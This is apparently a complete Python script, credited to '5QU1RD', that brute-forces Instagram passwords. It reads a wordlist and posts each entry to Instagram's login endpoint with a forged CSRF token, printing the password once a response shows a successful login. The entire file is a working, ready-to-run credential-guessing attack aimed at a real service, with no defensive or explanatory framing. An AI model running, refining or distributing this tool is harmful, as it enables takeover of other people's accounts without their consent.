#!/usr/bin/env python3

###############
#  BY 5QU1RD  #
###############

import requests
from datetime import datetime
import threading
from uuid import uuid4
import sys
import argparse

asciiArt = """
 ____              _         _ 
| ___|  __ _ _   _/ |_ __ __| |
|___ \ / _` | | | | | '__/ _` |
 ___) | (_| | |_| | | | | (_| |
|____/ \__, |\__,_|_|_|  \__,_|
          |_| 
"""

try:
	parser = argparse.ArgumentParser()
	parser.add_argument("-u", "--username")
	parser.add_argument("-w", "--wordlist")
	args = parser.parse_args()

	if args.wordlist and args.username:

		wordlist = args.wordlist
		username = args.username

		def login():
			print(asciiArt)
			with open(wordlist) as f:
				linhas = f.readlines()
				for linha in linhas:
					linha = linha.strip()
					time = int(datetime.now().timestamp())

					login_api_url = "https://www.instagram.com/accounts/login/ajax/"

					passwd = linha
					random_token = uuid4()

					payload = {
						"username": f"{username}",
						"enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{time}:{passwd}",
						"queryParams": {},
						"optIntoOneTap": "false"
					}

					header = {
						"User-Agent": "Insta Login Bot",
						"X-Requested-With": "XMLHttpRequest",
				    	"Referer": "https://www.instagram.com/accounts/login/",
						"x-csrftoken": f"{random_token}"
					}

					req = requests.post(login_api_url, data=payload, headers=header)
					if "status" in req.text or "error" in req.text:
						print(f"{passwd} INCORRECT PASSWORD FOR '{username}'")
						##FOR DEBUG REQUEST	print("{}\n\n".format(req.text))

					if "checkpoint_url" in req.text or "userId" in req.text:
						print(f"\n{passwd} PASSWORD CORRECT FOR '{username}'\n")
						## FOR DEBUG REQUEST print("{}\n\n".format(req.text))
						sys.exit(0)

		th = threading.Thread(target=login)
		th.start()
	else:
		print(asciiArt)
		parser.print_help()
except Exception as err:
		print(f"ERROR: {err}")
